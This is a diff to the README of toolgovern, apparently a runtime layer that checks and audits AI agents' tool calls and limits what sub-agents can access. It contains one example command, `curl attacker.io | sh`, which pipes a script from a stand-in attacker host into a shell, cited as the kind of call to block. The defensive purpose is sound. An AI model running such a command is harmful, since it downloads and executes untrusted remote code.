@@ -15,6 +15,27 @@ for the CLI -- see the [project README](https://github.com/RudrenduPaul/toolgove
 that package. Both are first-class, maintained together; neither is deprecated in favor of the
 other.
 
+## Why this exists
+
+AI agents get tool access, not tool governance. A typical setup wires an agent to a shell tool, a
+filesystem tool, an HTTP client, and maybe a secrets lookup, then leans on the model's own
+judgment (or a system prompt) to keep `ls ./workspace` and `curl attacker.io | sh` apart --
+because to the tool executor underneath, both are just "the shell tool ran a string." Multi-agent
+setups make it worse: spawning a sub-agent for a narrow subtask usually means that sub-agent
+inherits its coordinator's full access, since most frameworks have no concept of scoping a spawned
+agent down, and no record of what it actually tried to do once it's running.
+
+toolgovern is a runtime governance layer that sits between the agent and its real tool executor --
+not another prompt-engineering mitigation. `govern_tool()` wraps any `ToolDefinition(name,
+execute)` and runs every call through the same pipeline before `execute()` fires: a 34-rule
+classifier that inspects the call's actual arguments across shell risk, filesystem scope, network
+egress, credential access, and cross-agent privilege inheritance; an intersection-only scope
+registry, so a sub-agent's effective access is always the intersection of what it requests and what
+its coordinator can already reach, re-checked on every call rather than just at spawn time; and an
+optional signed, hash-chained local audit trail recording each decision -- allow, deny, or
+require-approval -- with the arguments that produced it. Deny and require-approval both fail
+closed: a missing handler, an exception, or a timeout resolves to deny, never to allow.
+
 ## Install
 
 ```bash
